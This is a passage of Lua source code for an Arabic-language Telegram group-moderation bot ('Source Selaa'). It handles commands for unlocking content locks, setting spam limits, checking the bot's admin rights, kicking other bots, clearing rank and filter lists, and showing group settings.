Selaa:set(Selaa..'Selaa:Lock:Fshar'..msg.chat_id_,true) Selaa:set(Selaa..'Selaa:Lock:Taf'..msg.chat_id_,true) Selaa:set(Selaa..'Selaa:Lock:Kfr'..msg.chat_id_,true) Selaa:hdel(Selaa.."Selaa:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
UnLockList ={'Selaa:Lock:EditMsgs','Selaa:Lock:Text','Selaa:Lock:Arabic','Selaa:Lock:English','Selaa:Lock:Join','Selaa:Lock:Bots','Selaa:Lock:Farsi','Selaa:Lock:FarsiBan','Selaa:Lock:TagServr','Selaa:Lock:Inline','Selaa:Lock:Photo','Selaa:Lock:Spam','Selaa:Lock:Videos','Selaa:Lock:Gifs','Selaa:Lock:Music','Selaa:Lock:Voice','Selaa:Lock:Links','Selaa:Lock:Location','Selaa:Lock:Tags','Selaa:Lock:Stickers','Selaa:Lock:Markdown','Selaa:Lock:Forwards','Selaa:Lock:Document','Selaa:Lock:Contact','Selaa:Lock:Hashtak','Selaa:Lock:WebLinks'}
for i,UnLock in pairs(UnLockList) do
Selaa:del(Selaa..UnLock..msg.chat_id_)
end
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم فتح جميع الاوامر \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
end
end
--     Source Selaa     --
if Admin(msg) then
if text and (text:match("^ضع سبام (%d+)$") or text:match("^وضع سبام (%d+)$")) then
local SetSpam = text:match("ضع سبام (%d+)$") or text:match("وضع سبام (%d+)$")
if tonumber(SetSpam) < 40 then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆اختر عدد اكبر من 40 حرف ', 1, 'md')
else
Selaa:set(Selaa..'Selaa:Spam:Text'..msg.chat_id_,SetSpam)
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم وضع عدد السبام ⇇'..SetSpam, 1, 'md')
end
end
end
--     Source Selaa     --
if Manager(msg) then
if text == "فحص" or text == "فحص البوت" then
local check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..Selaa)
local GetInfo = JSON.decode(check)
if GetInfo.ok == true then
if GetInfo.result.can_change_info == true then EDT = '✔️' else EDT = '✖️' end
if GetInfo.result.can_delete_messages == true then DEL = '✔️' else DEL = '✖️' end
if GetInfo.result.can_invite_users == true then INV = '✔️' else INV = '✖️' end
if GetInfo.result.can_pin_messages == true then PIN = '✔️' else PIN = '✖️' end
if GetInfo.result.can_restrict_members == true then BAN = '✔️' else BAN = '✖️' end
if GetInfo.result.can_promote_members == true then VIP = '✔️' else VIP = '✖️' end 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆صلاحيات البوت هي ⇇ ⤈\n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n↯☆حذف الرسائل ⇇ '..DEL..'\n↯☆دعوة المستخدمين ⇇ '..INV..'\n↯☆حظر المستخدمين ⇇ '..BAN..'\n↯☆تثبيت الرسائل ⇇ '..PIN..'\n↯☆تغيير المعلومات ⇇ '..EDT..'\n↯☆اضافة مشرفين ⇇ '..VIP..'\n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉', 1, 'md')
end end
if text and text:match("^تغير رد المطور (.*)$") then
local Text = text:match("^تغير رد المطور (.*)$") 
Selaa:set(Selaa.."Selaa:SudoBot:Rd"..msg.chat_id_,Text)
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم تغير رد المطور الى ⇇ "..Text, 1, 'md')
end
if text and text:match("^تغير رد منشئ الاساسي (.*)$") then
local Text = text:match("^تغير رد منشئ الاساسي (.*)$") 
Selaa:set(Selaa.."Selaa:BasicConstructor:Rd"..msg.chat_id_,Text)
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم تغير رد المنشئ الاساسي الى ⇇ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المنشئ (.*)$") then
local Text = text:match("^تغير رد المنشئ (.*)$") 
Selaa:set(Selaa.."Selaa:Constructor:Rd"..msg.chat_id_,Text)
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم تغير رد المنشئ الى ⇇ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المدير (.*)$") then
local Text = text:match("^تغير رد المدير (.*)$") 
Selaa:set(Selaa.."Selaa:Managers:Rd"..msg.chat_id_,Text) 
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم تغير رد المدير الى ⇇ "..Text, 1, 'md')
end
if text and text:match("^تغير رد الادمن (.*)$") then
local Text = text:match("^تغير رد الادمن (.*)$") 
Selaa:set(Selaa.."Selaa:Admins:Rd"..msg.chat_id_,Text)
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم تغير رد الادمن الى ⇇ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المميز (.*)$") then
local Text = text:match("^تغير رد المميز (.*)$") 
Selaa:set(Selaa.."Selaa:VipMem:Rd"..msg.chat_id_,Text)
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم تغير رد المميز الى ⇇ "..Text, 1, 'md')
end
if text and text:match("^تغير رد المنظف (.*)$") then
local Text = text:match("^تغير رد المنظف (.*)$") 
Selaa:set(Selaa.."Selaa:Cleaner:Rd"..msg.chat_id_,Text)
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم تغير رد المنظف الى ⇇ "..Text, 1, 'md')
end
if text and text:match("^تغير رد العضو (.*)$") then
local Text = text:match("^تغير رد العضو (.*)$") 
Selaa:set(Selaa.."Selaa:mem:Rd"..msg.chat_id_,Text)
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم تغير رد العضو الى ⇇ "..Text, 1, 'md')
end
if text == "حذف ردود الرتب" or text == "مسح ردود الرتب" then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم حذف جميع ردود الرتب", 1, 'md')
Selaa:del(Selaa.."Selaa:mem:Rd"..msg.chat_id_)
Selaa:del(Selaa.."Selaa:Cleaner:Rd"..msg.chat_id_)
Selaa:del(Selaa.."Selaa:VipMem:Rd"..msg.chat_id_)
Selaa:del(Selaa.."Selaa:Admins:Rd"..msg.chat_id_)
Selaa:del(Selaa.."Selaa:Managers:Rd"..msg.chat_id_)
Selaa:del(Selaa.."Selaa:Constructor:Rd"..msg.chat_id_)
Selaa:del(Selaa.."Selaa:BasicConstructor:Rd"..msg.chat_id_)
Selaa:del(Selaa.."Selaa:SudoBot:Rd"..msg.chat_id_)
end
end
--     Source Selaa     --
if text == "كشف البوتات" and ChCheck(msg) then 
local function cb(extra,result,success)
local admins = result.members_  
text = '↯☆*قائمة البوتات* ⇇ ⤈ \n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n'
local n = 0
local t = 0
for i=0 , #admins do 
n = (n + 1)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_
},function(arg,data) 
if result.members_[i].status_.ID == "ChatMemberStatusMember" then  
ab = ''
elseif result.members_[i].status_.ID == "ChatMemberStatusEditor" then  
t = t + 1
ab = ' ✯'
end
text = text.."~ [@"..data.username_..']'..ab.."\n"
if #admins == 0 then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆*لاتوجد بوتات هنا*", 1, 'md')
return false end
if #admins == i then 
local a = '┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n↯☆*عدد البوتات هنا* ⇇ '..n..'\n'
local f = '↯☆*عدد البوتات المرفوعه* ⇇ '..t..'\n↯☆*ملاحضه علامة الـ*✯ *تعني ان البوت ادمن في هذه المجموعه*'
Selaa(msg.chat_id_, msg.id_, 1, text..a..f, 1, 'md')
end
end,nil)
end
end
getChannelMembers(msg.chat_id_, 0, 'Bots', 200,cb)
end
if text == 'حذف البوتات' and ChCheck(msg) or text == 'طرد البوتات' and ChCheck(msg) or text == 'مسح البوتات' and ChCheck(msg) then
tdcli_function ({ ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp)  
local admins = dp.members_  
local x = 0
local c = 0
for i=0 , #admins do 
if dp.members_[i].status_.ID == "ChatMemberStatusEditor" then  
x = x + 1 
end
if tonumber(admins[i].user_id_) ~= tonumber(Selaa) then
ChatKick(msg.chat_id_,admins[i].user_id_)
end
c = c + 1
end     
if (c - x) == 0 then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆*لاتوجد بوتات هنا*", 1, 'md')
else
Selaa(msg.chat_id_, msg.id_, 1, "↯☆*عدد البوتات هنا* ⇇ "..c.."\n↯☆*عدد البوتات المرفوعه* ⇇ "..x.."\n↯☆*تم طرد* ⇇ "..(c - x).." *من البوتات*", 1, 'md')
end 
end,nil)  
end 
--     Source Selaa     --
end
--     Source Selaa     --
if Admin(msg) then
if text and text:match("^حذف (.*)$") and ChCheck(msg) or text and text:match("^مسح (.*)$") and ChCheck(msg) then
local txts = {string.match(text, "^(حذف) (.*)$")}
local txtss = {string.match(text, "^(مسح) (.*)$")}
if Sudo(msg) then 
if txts[2] == 'المطورين' or txtss[2] == 'المطورين' then
Selaa:del(Selaa..'Selaa:SudoBot:')
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم حذف المطورين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
end
if txts[2] == 'قائمه العام' or txtss[2] == 'قائمه العام' then
Selaa:del(Selaa..'Selaa:BanAll:')
Selaa:del(Selaa..'Selaa:MuteAll:')
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم حذف قائمة العام \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
end
end
if SudoBot(msg) then
if txts[2] == 'الادمنيه العامين' or txts[2] == 'الادمنيه العام' or txtss[2] == 'الادمنيه العامين' or txtss[2] == 'الادمنيه العام' then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم حذف الادمنيه العامين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:AdminAll:')
end
if txts[2] == 'المميزين عام' or txts[2] == 'المميزين العامين' or txtss[2] == 'المميزين عام' or txtss[2] == 'المميزين العامين' then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم حذف المميزين عام \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:VipAll:')
end
if txts[2] == 'المدراء العامين' or txts[2] == 'المدراء العام' or txtss[2] == 'المدراء العامين' or txtss[2] == 'المدراء العام' then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم حذف المدراء العامين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:ManagerAll:')
end
end
if SelaaConstructor(msg) then
if txts[2] == 'المنشئين الاساسيين' or txtss[2] == 'المنشئين الاساسيين' then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم حذف المنشئين الاساسيين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:BasicConstructor:'..msg.chat_id_)
end
end
if BasicConstructor(msg) then
if txts[2] == 'المنشئين' or txtss[2] == 'المنشئين' then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم حذف المنشئين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Constructor:'..msg.chat_id_)
end end
if Constructor(msg) then
if txts[2] == 'المدراء' or txtss[2] == 'المدراء' then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم حذف المدراء \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Managers:'..msg.chat_id_)
end 
if txts[2] == 'المنظفين' or txtss[2] == 'المنظفين' then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم حذف المنظفين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Cleaner:'..msg.chat_id_)
end end
if Manager(msg) then
if txts[2] == 'الادمنيه' or txtss[2] == 'الادمنيه' then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم حذف الادمنيه \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Admins:'..msg.chat_id_)
end
end
if txts[2] == 'المطايه' or txtss[2] == 'المطايه' then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم حذف المطايه \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'User:Donky:'..msg.chat_id_)
end
if txts[2] == 'الرابط' or txtss[2] == 'الرابط' then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم حذف رابط المجموعه \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa.."Selaa:Groups:Links"..msg.chat_id_)
end
if txts[2] == 'المميزين' or txtss[2] == 'المميزين' then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم حذف المميزين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:VipMem:'..msg.chat_id_)
end
if txts[2] == 'المكتومين' or txtss[2] == 'المكتومين' then
Selaa:del(Selaa..'Selaa:Muted:'..msg.chat_id_)
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم حذف المكتومين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
end
if txts[2] == 'المقيدين' or txtss[2] == 'المقيدين' then     
local list = Selaa:smembers(Selaa..'Selaa:Tkeed:'..msg.chat_id_)
for k,v in pairs(list) do   
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..v.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True") 
Selaa:srem(Selaa..'Selaa:Tkeed:'..msg.chat_id_, v)
end 
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم حذف المقيدين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
end
if txts[2] == 'قائمه المنع' or txtss[2] == 'قائمه المنع' then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم حذف قائمة المنع \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Filters:'..msg.chat_id_)
end
if txts[2] == 'قوائم المنع' or txtss[2] == 'قوائم المنع' then
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم حذف قوائم المنع \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:del(Selaa..'Selaa:Filters:'..msg.chat_id_)
Selaa:del(Selaa.."Selaa:FilterAnimation"..msg.chat_id_)
Selaa:del(Selaa.."Selaa:FilterPhoto"..msg.chat_id_)
Selaa:del(Selaa.."Selaa:FilterSteckr"..msg.chat_id_)
end
if txts[2] == 'قائمه منع المتحركات' or txtss[2] == 'قائمه منع المتحركات' then     
Selaa:del(Selaa.."Selaa:FilterAnimation"..msg.chat_id_)
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم حذف قائمة منع المتحركات \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
end
if txts[2] == 'قائمه منع الصور' or txtss[2] == 'قائمه منع الصور' then     
Selaa:del(Selaa.."Selaa:FilterPhoto"..msg.chat_id_)
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم حذف قائمة منع الصور \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
end
if txts[2] == 'قائمه منع الملصقات' or txtss[2] == 'قائمه منع الملصقات' then     
Selaa:del(Selaa.."Selaa:FilterSteckr"..msg.chat_id_)
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم حذف قائمة منع الملصقات \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
end
end
end
--     Source Selaa     --
if text and text:match("^حذف القوائم$") and ChCheck(msg) or text and text:match("^مسح القوائم$") and ChCheck(msg) then
if not BasicConstructor(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆للمنشئ الاساسي فقط', 1, 'md')
else
Selaa:del(Selaa..'Selaa:Ban:'..msg.chat_id_) Selaa:del(Selaa..'Selaa:Admins:'..msg.chat_id_) Selaa:del(Selaa..'User:Donky:'..msg.chat_id_) Selaa:del(Selaa..'Selaa:VipMem:'..msg.chat_id_) Selaa:del(Selaa..'Selaa:Filters:'..msg.chat_id_) Selaa:del(Selaa..'Selaa:Muted:'..msg.chat_id_)
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم حذف ⇇ ❨ قائمة المنع • المحظورين • المكتومين • الادمنيه • المميزين • المطايه ❩ بنجاح \n ✓", 1, 'md')
end end
--     Source Selaa     --
if text and text:match("^حذف جميع الرتب$") and ChCheck(msg) or text and text:match("^مسح جميع الرتب$") and ChCheck(msg) or text and text:match("^تنزيل جميع الرتب$") and ChCheck(msg) then
if not SelaaConstructor(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆لمنشئ المجموعه فقط', 1, 'md')
else
local basicconstructor = Selaa:smembers(Selaa..'Selaa:BasicConstructor:'..msg.chat_id_)
local constructor = Selaa:smembers(Selaa..'Selaa:Constructor:'..msg.chat_id_)
local Managers = Selaa:smembers(Selaa..'Selaa:Managers:'..msg.chat_id_)
local admins = Selaa:smembers(Selaa..'Selaa:Admins:'..msg.chat_id_)
local vipmem = Selaa:smembers(Selaa..'Selaa:VipMem:'..msg.chat_id_)
local donky = Selaa:smembers(Selaa..'User:Donky:'..msg.chat_id_)
if #basicconstructor ~= 0 then basicconstructort = 'المنشئين الاساسيين • ' else basicconstructort = '' end
if #constructor ~= 0 then constructort = 'المنشئين • ' else constructort = '' end
if #Managers ~= 0 then Managerst = 'المدراء • ' else Managerst = '' end
if #admins ~= 0 then adminst = 'الادمنيه • ' else adminst = '' end
if #vipmem ~= 0 then vipmemt = 'المميزين • ' else vipmemt = '' end
if #donky ~= 0 then donkyt = 'المطايه • ' else donkyt = '' end
if #basicconstructor ~= 0 or #constructor ~= 0 or #Managers ~= 0 or #admins ~= 0 or #vipmem ~= 0 or #donky ~= 0 then 
Selaa:del(Selaa..'Selaa:BasicConstructor:'..msg.chat_id_)
Selaa:del(Selaa..'Selaa:Constructor:'..msg.chat_id_)
Selaa:del(Selaa..'Selaa:Managers:'..msg.chat_id_)
Selaa:del(Selaa..'Selaa:Admins:'..msg.chat_id_)
Selaa:del(Selaa..'Selaa:VipMem:'..msg.chat_id_)
Selaa:del(Selaa..'User:Donky:'..msg.chat_id_)
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم حذف جميع الرتب التاليه ⇇ ❨ "..basicconstructort..''..constructort..''..Managerst..''..adminst..''..vipmemt..''..donkyt.." ❩ بنجاح \n ✓", 1, 'md')
else
Selaa(msg.chat_id_, msg.id_, 1, "↯☆لاتوجد رتب هنا", 1, 'md')
end 
end 
end
--     Source Selaa     --
if Admin(msg) then 
if text and text:match("^الاعدادات$") and ChCheck(msg) then
if not Selaa:get(Selaa..'Selaa:Spam:Text'..msg.chat_id_) then
spam_c = 400
else
spam_c = Selaa:get(Selaa..'Selaa:Spam:Text'..msg.chat_id_)
end
--     Source Selaa     --
if Selaa:hget(Selaa.."Selaa:Spam:Group:User"..msg.chat_id_, "Spam:User") == "kick" then     
flood = "بالطرد"     
elseif Selaa:hget(Selaa.."Selaa:Spam:Group:User"..msg.chat_id_,"Spam:User") == "keed" then     
flood = "بالتقييد"     
elseif Selaa:hget(Selaa.."Selaa:Spam:Group:User"..msg.chat_id_,"Spam:User") == "mute" then     
flood = "بالكتم"           
elseif Selaa:hget(Selaa.."Selaa:Spam:Group:User"..msg.chat_id_,"Spam:User") == "del" then     
flood = "بالحذف"
else     
flood = "مفتوح"     
end
--     Source Selaa     --
if Selaa:get(Selaa.."Selaa:Lock:Bots"..msg.chat_id_) == "del" then
lock_bots = "بالحذف"
elseif Selaa:get(Selaa.."Selaa:Lock:Bots"..msg.chat_id_) == "ked" then
lock_bots = "بالتقييد"   
elseif Selaa:get(Selaa.."Selaa:Lock:Bots"..msg.chat_id_) == "kick" then
lock_bots = "بالطرد"    
else
lock_bots = "مفتوحه"    
end
--     Source Selaa     --
if Selaa:get(Selaa..'Selaa:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه'end
if Selaa:get(Selaa..'Selaa:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفله' else mute_photo = 'مفتوحه' end
if Selaa:get(Selaa..'Selaa:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفله' else mute_video = 'مفتوحه' end
if Selaa:get(Selaa..'Selaa:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفله' else mute_gifs = 'مفتوحه' end
if Selaa:get(Selaa..'Selaa:Lock:Music'..msg.chat_id_) then mute_music = 'مقفله' else mute_music = 'مفتوحه' end
if Selaa:get(Selaa..'Selaa:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفله' else mute_in = 'مفتوحه' end
if Selaa:get(Selaa..'Selaa:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفله' else mute_voice = 'مفتوحه' end
if Selaa:get(Selaa..'Selaa:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفله' else mute_edit = 'مفتوحه' end
if Selaa:get(Selaa..'Selaa:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end
if Selaa:get(Selaa..'Selaa:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفله' else lock_pin = 'مفتوحه' end
if Selaa:get(Selaa..'Selaa:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفله' else lock_sticker = 'مفتوحه' end
if Selaa:get(Selaa..'Selaa:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفله' else lock_tgservice = 'مفتوحه' end
if Selaa:get(Selaa..'Selaa:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفله' else lock_wp = 'مفتوحه' end
if Selaa:get(Selaa..'Selaa:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفله' else lock_htag = 'مفتوحه' end
if Selaa:get(Selaa..'Selaa:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفله' else lock_tag = 'مفتوحه' end
if Selaa:get(Selaa..'Selaa:Lock:Location'..msg.chat_id_) then lock_location = 'مقفله' else lock_location = 'مفتوحه' end
if Selaa:get(Selaa..'Selaa:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفله' else lock_contact = 'مفتوحه' end
if Selaa:get(Selaa..'Selaa:Lock:English'..msg.chat_id_) then lock_english = 'مقفله' else lock_english = 'مفتوحه' end
if Selaa:get(Selaa..'Selaa:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفله' else lock_arabic = 'مفتوحه' end
if Selaa:get(Selaa..'Selaa:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفله' else lock_forward = 'مفتوحه' end
if Selaa:get(Selaa..'Selaa:Lock:Document'..msg.chat_id_) then lock_file = 'مقفله' else lock_file = 'مفتوحه' end
if Selaa:get(Selaa..'Selaa:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفله' else markdown = 'مفتوحه' end
if Selaa:get(Selaa..'Selaa:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفله' else lock_spam = 'مفتوحه' end
if Selaa:get(Selaa..'Selaa:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفل' else lock_Join = 'مفتوح' end
if Selaa:get(Selaa.."Selaa:Lock:Welcome"..msg.chat_id_) then send_welcome = 'مقفله' else send_welcome = 'مفتوحه' end
if Selaa:get(Selaa..'Selaa:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end
if Selaa:get(Selaa..'Selaa:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end
if Selaa:get(Selaa..'Selaa:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end
if Selaa:get(Selaa..'Selaa:Lock:Farsi'..msg.chat_id_) then lock_farsi = 'مقفله' else lock_farsi = 'مفتوحه' end
local Flood_Num = Selaa:hget(Selaa.."Selaa:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
--     Source Selaa     --
local TXTE = "↯☆اعدادات المجموعه ⇇ ⤈\n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n"
.."↯☆الروابط ⇇ "..mute_links.."\n"
.."↯☆المعرف ⇇ "..lock_tag.."\n"
.."↯☆البوتات ⇇ "..lock_bots.."\n"
.."↯☆المتحركه ⇇ "..mute_gifs.."\n"
.."↯☆الملصقات ⇇ "..lock_sticker.."\n"
.."↯☆الملفات ⇇ "..lock_file.."\n"
.."↯☆الصور ⇇ "..mute_photo.."\n"
.."↯☆الفيديو ⇇ "..mute_video.."\n"
.."↯☆الاونلاين ⇇ "..mute_in.."\n"
.."↯☆الدردشه ⇇ "..mute_text.."\n"
.."↯☆التوجيه ⇇ "..lock_forward.."\n"
.."↯☆الاغاني ⇇ "..mute_music.."\n"
.."↯☆الصوت ⇇ "..mute_voice.."\n"
.."↯☆الجهات ⇇ "..lock_contact.."\n"
.."↯☆الماركداون ⇇ "..markdown.."\n"
.."↯☆الهاشتاك ⇇ "..lock_htag.."\n"
.."↯☆التعديل ⇇ "..mute_edit.."\n"
.."↯☆التثبيت ⇇ "..lock_pin.."\n"
.."↯☆الاشعارات ⇇ "..lock_tgservice.."\n"
.."↯☆الكلايش ⇇ "..lock_spam.."\n"
.."↯☆الدخول ⇇ "..lock_Join.."\n"
.."↯☆الشبكات ⇇ "..lock_wp.."\n"
.."↯☆المواقع ⇇ "..lock_location.."\n"
.."↯☆الفشار ⇇ "..lock_fshar.."\n"
.."↯☆الكفر ⇇ "..lock_kaf.."\n"
.."↯☆الطائفيه ⇇ "..lock_taf.."\n"
.."↯☆العربيه ⇇ "..lock_arabic.."\n"
.."↯☆الانجليزيه ⇇ "..lock_english.."\n"
.."↯☆الفارسيه ⇇ "..lock_farsi.."\n"
.."↯☆التكرار ⇇ "..flood.."\n"
.."↯☆عدد التكرار ⇇ "..Flood_Num.."\n"
.."↯☆عدد السبام ⇇ "..spam_c.."\n"
.."┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n↯☆[Source Channel](https://t.me/sourcesela)\n"
Selaa(msg.chat_id_, msg.id_, 1, TXTE, 1, 'md')
end
end
--     Source Selaa     --
if text and text:match("^كول (.*)$") and ChCheck(msg) then
local txt = {string.match(text, "^(كول) (.*)$")}
Selaa(msg.chat_id_,0, 1, txt[2], 1, 'md')
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
--     Source Selaa     --
if Selaa:get(Selaa..'Selaa:setrules'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم الغاء حفظ قوانين المجموعه', 1, 'md')
Selaa:del(Selaa..'Selaa:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
Selaa:del(Selaa..'Selaa:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
Selaa:set(Selaa..'Selaa:rules'..msg.chat_id_,text)
Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم حفظ قوانين المجموعه', 1, 'md')
return false   
end
if text and text:match("^ضع قوانين$") and ChCheck(msg) or text and text:match("^وضع قوانين$") and ChCheck(msg) then
